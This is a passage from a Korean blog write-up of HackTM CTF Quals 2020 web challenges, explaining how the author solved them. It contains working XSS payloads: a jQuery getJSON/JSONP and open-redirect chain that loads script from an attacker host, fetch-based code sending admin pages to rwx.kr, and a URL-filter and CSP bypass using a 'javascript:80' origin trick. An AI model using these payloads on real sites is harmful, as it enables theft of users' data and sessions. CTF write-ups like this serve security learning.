class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"chat-personalization"</span> <span class="attr">data-chat_url</span>=<span class="string">"/api/messages/"</span> <span class="attr">data-param</span>=<span class="string">"admin"</span> <span class="attr">data-start_qualifier</span>=<span class="string">"__P"</span> <span class="attr">data-end_qualifier</span>=<span class="string">"P__"</span> <span class="attr">data-source_path_empty</span>=<span class="string">""</span> <span class="attr">data-disable_cache</span>=<span class="string">"true"</span> <span class="attr">data-css_selector</span>=<span class="string">".chatform_hidden"</span> <span class="attr">data-last_update</span>=<span class="string">"1580610880.0"</span> <span class="attr">class</span>=<span class="string">"hidden"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>/messages?username=admin</code> 에서 관리자와 대화할 수 있는 기능이 주어지는데<br>페이지 중간에 위와 같은 태그가 존재합니다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"chat-personalization"</span> <span class="attr">data-chat_url</span>=<span class="string">"/api/messages/"</span> <span class="attr">data-param</span>=<span class="string">"../../login?next=http://rwx.kr/1.js?x=?"</span> <span class="attr">data-start_qualifier</span>=<span class="string">"__P"</span> <span class="attr">data-end_qualifier</span>=<span class="string">"P__"</span> <span class="attr">data-source_path_empty</span>=<span class="string">""</span> <span class="attr">data-disable_cache</span>=<span class="string">"true"</span> <span class="attr">data-css_selector</span>=<span class="string">".chatform_hidden"</span> <span class="attr">data-last_update</span>=<span class="string">"1580610880.0"</span> <span class="attr">class</span>=<span class="string">"hidden"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>data-param</code> 부분에 대화하는 상대방의 유저명이 포함되며, 예를 들어 <code>../../login?next=http://rwx.kr/1.js?x=?</code> 이라는 이름으로 가입한 경우 위와 같은 상태가 됩니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkNewMessages</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> chat = $(<span class="string">"#chat-personalization"</span>);</span><br><span class="line">    <span class="keyword">if</span> (!chat.length) &#123;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> chat_url = chat.data(<span class="string">"chat_url"</span>);</span><br><span class="line">    <span class="keyword">var</span> param = chat.data(<span class="string">"param"</span>);</span><br><span class="line">    <span class="keyword">var</span> start_qualifier = chat.data(<span class="string">"start_qualifier"</span>);</span><br><span class="line">    <span class="keyword">var</span> end_qualifier = chat.data(<span class="string">"end_qualifier"</span>);</span><br><span class="line">    <span class="keyword">var</span> source_path_empty = chat.data(<span class="string">"source_path_empty"</span>);</span><br><span class="line">    <span class="keyword">var</span> disable_cache = chat.data(<span class="string">"disable_cache"</span>);</span><br><span class="line">    <span class="keyword">var</span> css_selector = chat.data(<span class="string">"css_selector"</span>);</span><br><span class="line">    <span class="keyword">var</span> enable_decrypt = chat.data(<span class="string">"enable_decrypt"</span>);</span><br><span class="line">    <span class="keyword">var</span> last_update = +chat.data(<span class="string">"last_update"</span>) || <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!source_path_empty) &#123;</span><br><span class="line">      <span class="keyword">var</span> vid = param;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">typeof</span> vid != <span class="string">'undefined'</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> f = (disable_cache) ? vid.toLowerCase() : vid.toLowerCase().substring(<span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">var</span> c = (disable_cache) ? &#123;</span><br><span class="line">          _: <span class="keyword">new</span> <span class="built_in">Date</span>().getTime()</span><br><span class="line">        &#125; : &#123;&#125;;</span><br><span class="line">        <span class="comment">// personalize with backend data</span></span><br><span class="line">        <span class="keyword">var</span> ajax = $.getJSON(chat_url + f, c);</span><br><span class="line">        ...</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    setInterval(checkNewMessages, <span class="number">2000</span>);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><p><code>/static/app.js</code> 파일의 최하단을 확인해 보면 <code>chat_url + f</code> 을 인자로 하여 <code>$.getJSON</code> 함수를 실행하고 있습니다. <code>chat_url</code> 값을 고정으로 <code>/api/messages/</code> 이며 <code>f</code> 값은 유저명입니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$.getJSON(<span class="string">'/api/message/'</span> + <span class="string">'../../login?next=http://rwx.kr/1.js?x=?'</span>)</span><br></pre></td></tr></table></figure><p>따라서 <code>../../login?next=http://rwx.kr/1.js?x=?</code> 를 유저명으로 하여 관리자에게 메시지를 보내면, 관리자는 위와 같은 형태의 함수 호출을 하게 됩니다.<br><code>url</code> 뒤에 <code>?x=?</code> 를 붙여준 이유는 jquery의 <code>getJSON</code> 함수가 이와 같은 형태의 <code>url</code> 을 인자로 받으면 <code>?</code> 부분에 <code>jQuery34108898913333225196_1580687420744</code> 와 같이 난수가 포함된 문자열로 요청을 시도하며, 받아온 결과값을 스크립트로서 실행하는 기능이 존재하기 때문입니다.</p><p>이러한 기능은 본래 <code>jsonp</code> 페이지를 지원하기 위해 존재하는 기능이지만, <code>open redirection</code> 취약점과 결합하면 공격자의 서버에서 임의의 스크립트를 받아와 실행하도록 할 수 있습니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fetch(<span class="string">'/profile'</span>).then(<span class="function"><span class="params">x</span> =&gt;</span> x.text()).then(<span class="function"><span class="params">x</span> =&gt;</span> &#123;</span><br><span class="line">    location = <span class="string">'http://rwx.kr/?d='</span> + btoa(x);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>서버에 스크립트를 저장해둔뒤, 관리자가 요청하도록 하였습니다.<br>이후 <code>fetch</code> 함수를 통해 <code>/profile</code> 페이지를 받아와 결과 페이지를 공격자 서버로 반환하도록 합니다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"fullname"</span>&gt;</span>Fullname<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">id</span>=<span class="string">"fullname"</span> <span class="attr">name</span>=<span class="string">"fullname"</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">"HackTM&#123;3f07fcaba6c72e3ffb640bbe9dab0edad15c84e390b8c323aa0bc3178ad7c65b&#125;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>관리자에게 메시지를 보내 스크립트를 실행 시킨 후, 서버에 전송된 데이터를 디코딩 하여 확인해 보면, 관리자의 <code>fullname</code> 부분에 플래그가 존재하는 것을 확인할 수 있습니다.</p><h2 id="497pts-Humans-of-Dancers-4th-solve"><a href="#497pts-Humans-of-Dancers-4th-solve" class="headerlink" title="[497pts] Humans of Dancers (4th solve)"></a>[497pts] <a href="#humans-of-dancers">Humans of Dancers</a> (4th solve)</h2><blockquote><p>Please do not brute-force for any files or directories.<br>Recommended browser: Chrome<br><a href="http://178.128.175.6:20900/" target="_blank" rel="noopener">http://178.128.175.6:20900/</a></p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.freeze(location);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> DEFAULT_ROUTE = <span class="string">'/page/acasa'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> $page = $(<span class="string">'.page'</span>);</span><br><span class="line"><span class="keyword">var</span> $pageFrame = $page.find(<span class="string">'.page__frame'</span>);</span><br><span class="line"><span class="keyword">var</span> currentRoute = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> isValidUrl = <span class="function"><span class="keyword">function</span> (<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ((url.toLowerCase().startsWith(<span class="string">'//'</span>))) &#123;</span><br><span class="line">        url = <span class="string">"https:"</span> +  url;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> isValidUrl = isValidJSURL(url);</span><br><span class="line">    <span class="keyword">let</span> isUrl = isValidPattern(url);</span><br><span class="line">    <span class="keyword">let</span> sameDomain = url.toLowerCase().startsWith(<span class="string">'/'</span>) &amp;&amp; !url.substr(<span class="number">1</span>).toLowerCase().startsWith(<span class="string">'/'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> ret = ((isValidUrl &amp;&amp; isUrl) || sameDomain);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> expression = <span class="regexp">/^(https?\:\/\/)?[a-zA-Z0-9_-]+(.[a-zA-Z0-9_-]+)*.[a-zA-Z]&#123;2,4&#125;(\/[a-zA-Z0-9_]+)&#123;0,15&#125;(\/[a-zA-Z0-9_]+.[a-zA-Z]&#123;2,4&#125;(\?[a-zA-Z0-9_]+\=[a-zA-Z0-9_]+)?)?(\&amp;[a-zA-Z0-9_]+\=[a-zA-Z0-9_]+)&#123;0,15&#125;$/gi</span>;</span><br><span class="line"><span class="keyword">var</span> regex = <span class="keyword">new</span> <span class="built_in">RegExp</span>(expression);</span><br><span class="line"><span class="keyword">var</span> isValidPattern = <span class="function"><span class="keyword">function</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> urlNoQueryString = url.split(<span class="string">'?'</span>)[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">return</span> (url != <span class="literal">null</span> &amp;&amp; !(urlNoQueryString.match(regex) === <span class="literal">null</span> || (url.split(<span class="string">" "</span>).length - <span class="number">1</span>) &gt; <span class="number">0</span>));</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> isValidJSURL = <span class="function"><span class="keyword">function</span> (<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!(url.toLowerCase().startsWith(<span class="string">"http://"</span>) || url.toLowerCase().startsWith(<span class="string">'https://'</span>))) &#123;</span><br><span class="line">        url = <span class="string">'https://'</span> +  url;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> toOpenUrl;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        toOpenUrl = <span class="keyword">new</span> URL(url);</span><br><span class="line">        <span class="keyword">return</span> toOpenUrl.origin !== <span class="string">'null'</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>/static/app.js</code> 파일을 확인해 보면 <code>hash</code> 값에 주어진 문자열을 인자로 하여 <code>isValidUrl</code> 함수를 호출하여 안전한 주소인지 확인한 후에, <code>iframe</code> 태그의 <code>src</code> 속성으로 설정합니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/^(https?\:\/\/)?[a-zA-Z0<span class="number">-9</span>_-]+(.[a-zA-Z0<span class="number">-9</span>_-]+)*.[a-zA-Z]&#123;<span class="number">2</span>,<span class="number">4</span>&#125;(\/[a-zA-Z0<span class="number">-9</span>_]+)&#123;<span class="number">0</span>,<span class="number">15</span>&#125;(\/[a-zA-Z0<span class="number">-9</span>_]+.[a-zA-Z]&#123;<span class="number">2</span>,<span class="number">4</span>&#125;(\?[a-zA-Z0<span class="number">-9</span>_]+\=[a-zA-Z0<span class="number">-9</span>_]+)?)?(\&amp;[a-zA-Z0<span class="number">-9</span>_]+\=[a-zA-Z0<span class="number">-9</span>_]+)&#123;<span class="number">0</span>,<span class="number">15</span>&#125;$/gi</span><br><span class="line"><span class="comment">// matches with https://javascript:80/1-%60html;t/aa/b/c,pa?a=1%60,alert(1) ...</span></span><br></pre></td></tr></table></figure><p>먼저 <code>isUrl</code> 에서 사용하는 정규식이 상당히 번잡한데, url의 <code>.</code> 문자가 escape 되지 않고 모든 문자와 매칭되도록 하고 있습니다.<br>따라서 <code>https://javascript:80/1-%60html;t/aa/b/c,pa?a=1%60,alert(1)</code> 를 통해 우회할 수 있습니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> isValidJSURL = <span class="function"><span class="keyword">function</span> (<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!(url.toLowerCase().startsWith(<span class="string">"http://"</span>) || url.toLowerCase().startsWith(<span class="string">'https://'</span>))) &#123;</span><br><span class="line">        url = <span class="string">'https://'</span> +  url;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> toOpenUrl;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        toOpenUrl = <span class="keyword">new</span> URL(url);</span><br><span class="line">        <span class="keyword">return</span> toOpenUrl.origin !== <span class="string">'null'</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>isValidJSURL</code> 함수에서는 주어진 <code>url</code> 의 <code>origin</code> 을 확인하는데 <code>https://javascript:80/1-%60html;t/aa/b/c,pa?a=1%60,alert(1)</code> 의 경우 <code>javascript:80</code> 을 origin 으로 인식합니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; csp</span><br><span class="line">Content-Security-Policy: base-uri &#39;self&#39;; block-all-mixed-content; frame-ancestors &#39;self&#39;; object-src &#39;none&#39;; connect-src &#39;self&#39;; frame-src &#39;self&#39; https:&#x2F;&#x2F;www.youtube.com https:&#x2F;&#x2F;www.google.com; script-src &#39;self&#39; &#39;unsafe-inline&#39; https:&#x2F;&#x2F;cdnjs.cloudflare.com https:&#x2F;&#x2F;www.google.com&#x2F;recaptcha&#x2F;api.js https:&#x2F;&#x2F;www.gstatic.com&#x2F;recaptcha&#x2F;; report-uri &#x2F;api&#x2F;report-csp</span><br><span class="line">&#x2F;&#x2F; app.js</span><br><span class="line">Object.freeze(location);</span><br></pre></td></tr></table></figure><p>위에서 필터링 함수를 우회하는데에 성공하면 <code>hash</code> 값을 조작함으로써 마음대로 스크립트를 실행할 수 있는데, csp와 <code>Object.freeze(location)</code> 을 통해 외부로 데이터 전송을 방지하고 있습니다.<br>하지만 <code>top.location.replace(&#39;...&#39;)</code> 을 통해 <code>location</code> 이동을 하여 외부로 데이터를 보내도록 할 수 있습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;178.128.175.6:20900&#x2F;#javascript:80&#x2F;1-%60html;t&#x2F;aa&#x2F;b&#x2F;c,pa?a&#x3D;1%60,fetch(&#39;&#x2F;admin&#39;).then(x&#x3D;%3Ex.text()).then(x&#x3D;%3Etop.location.replace(&#39;&#x2F;&#x2F;rwx.kr&#x2F;?&#39;%2bbtoa(x)))</span><br></pre></td></tr></table></figure><p>위 주소는 <code>/admin</code> 페이지를 가져와 공격자의 서버로 전송하도록 합니다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- &lt;a href="#/page/sugestii"&gt;Sugestii&lt;/a&gt; --&gt;</span></span><br></pre></td></tr></table></figure><p>페이지를 중간에 위와 같은 주석이 존재하는데, 접속해 보면 아래와 같은 페이지가 보입니다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"path"</span> <span class="attr">name</span>=<span class="string">"path"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">value</span>=<span class="string">"/#/page/acasa"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"csrf_token"</span> <span class="attr">name</span>=<span class="string">"csrf_token"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">value</span>=<span class="string">"Ijc2NTM2MGNiOTBkZTI4Y2E4ZGExMGRkMTk0NTAwNjE3MGNkNjZmYjAi.XjdpKQ.sFQg9QIAZLFkqSWYsMgfljOT5UA"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">cols</span>=<span class="string">"60"</span> <span class="attr">id</span>=<span class="string">"message"</span> <span class="attr">name</span>=<span class="string">"message"</span> <span class="attr">placeholder</span>=<span class="string">"Scrie parerea ta"</span> <span class="attr">required</span> <span class="attr">rows</span>=<span class="string">"20"</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'https://www.google.com/recaptcha/api.js'</span> <span class="attr">async</span> <span class="attr">defer</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"g-recaptcha"</span> <span class="attr">data-sitekey</span>=<span class="string">"6LfE7dQUAAAAABOc1rpiWCU0CQF9Msv2XBdvgd5q"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Trimite sugestie"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>hidden</code> 타입의 <code>input</code> 태그를 확인할 수 있는데, 여기에 만든 페이로드인 <code>/#javascript:80/1-%60html;t/aa/b/c,pa?a=1%60,fetch(&#39;/admin&#39;).then(x=%3Ex.text()).then(x=%3Etop.location.replace(&#39;//rwx.kr/?&#39;%2bbtoa(x)))</code> 를 전송해 주면 곧 관리자가 확인하고, <code>/admin</code> 페이지 내용이 수신됩니다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// log</span><br><span class="line">178.128.175.6 - - [03/Feb/2020:01:33:35 +0900] "GET /?PHA+CkhhY2tUTXs2NzA4ZTdhOGQxYWM4YmZhYWFlYjNmNmFhNzY2YjJjOTAzYmE3ZTgyNjQ2Y2E1YjgzYjVhMjBjOTQwYzU0ZjlhfQo8L3A+Cg== HTTP/1.1" 200 67 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.130 Safari/537.36"</span><br><span class="line">// decoded</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">HackTM&#123;6708e7a8d1ac8bfaaaeb3f6aa766b2c903ba7e82646ca5b83b5a20c940c54f9a&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>데이터에서 플래그를 확인할 수 있습니다.</p></div></article><div class="blog-post-comments"><div id="disqus_thread"><noscript>Please enable JavaScript to view the comments.</noscript></div></div><div id="footer-post-container"><div id="footer-post"><div id="nav-footer" style="display:none"><ul></ul></div><div id="toc-footer" style="display:none"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#175pts-Draw-with-us-1st-solve"><span class="toc-number">1.</span> <span class="toc-text">[175pts] Draw with us (1st solve)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#280pts-My-Bank"><span class="toc-number">2.</span> <span class="toc-text">[280pts] My Bank</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#497pts-mIRC-3rd-solve"><span class="toc-number">3.</span> <span class="toc-text">[497pts] mIRC (3rd solve)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#497pts-Humans-of-Dancers-4th-solve"><span class="toc-number">4.</span> <span class="toc-text">[497pts] Humans of Dancers (4th solve)</span></a></li></ol></div><div id="share-footer" style="display:none"><ul><li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.p6.is/hacktm-ctf-quals-2020/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.p6.is/hacktm-ctf-quals-2020/&text=HackTM CTF Quals 2020"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li></ul></div><div id="actions-footer"><a id="menu" class="icon" href="#" onclick='return $("#nav-footer").toggle(),!1'><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a> <a id="toc" class="icon" href="#" onclick='return $("#toc-footer").toggle(),!1'><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a> <a id="share" class="icon" href="#" onclick='return $("#share-footer").toggle(),!1'><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a> <a id="top" style="display:none" class="icon" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")'><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></div></div></div><footer id="footer"><div class="footer-left">Copyright &copy; 2022 posix</div><div class="footer-right"><nav><ul></ul></nav></div></footer></div><link rel="stylesheet" href="/lib/font-awesome/css/all.min.css"><link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css"><script src="/lib/jquery/jquery.min.js"></script><script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script>$(function(){$(".highlight table").before('<span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="far fa-clone"></i></span>'),new ClipboardJS(".btn-copy",{text:function(e){return Array.from(e.nextElementSibling.querySelectorAll(".code")).reduce((e,t)=>e+t.innerText+"\n","")}}).on("success",function(e){e.trigger.setAttribute("aria-label","Copied!"),e.clearSelection()})})</script><script src="/js/main.js"></script><script>!function(e,a,t,n,g,c){e.GoogleAnalyticsObject=n,e.ga=e.ga||function(){(e.ga.q=e.ga.q||[]).push(arguments)},e.ga.l=+new Date,g=a.createElement(t),c=a.getElementsByTagName(t)[0],g.async=1,g.src="//www.google-analytics.com/analytics.js",c.parentNode.insertBefore(g,c)}(window,document,"script","ga"),ga("create","UA-158869268-1","auto"),ga("send","pageview")</script><script>var disqus_shortname="posix-blog";!function(){var e=document.createElement("script");e.type="text/javascript",e.async=!0,e.src="//"+disqus_shortname+".disqus.com/embed.js",(document.getElementsByTagName("head")[0]||document.getElementsByTagName("body")[0]).appendChild(e)}()</script></body></html>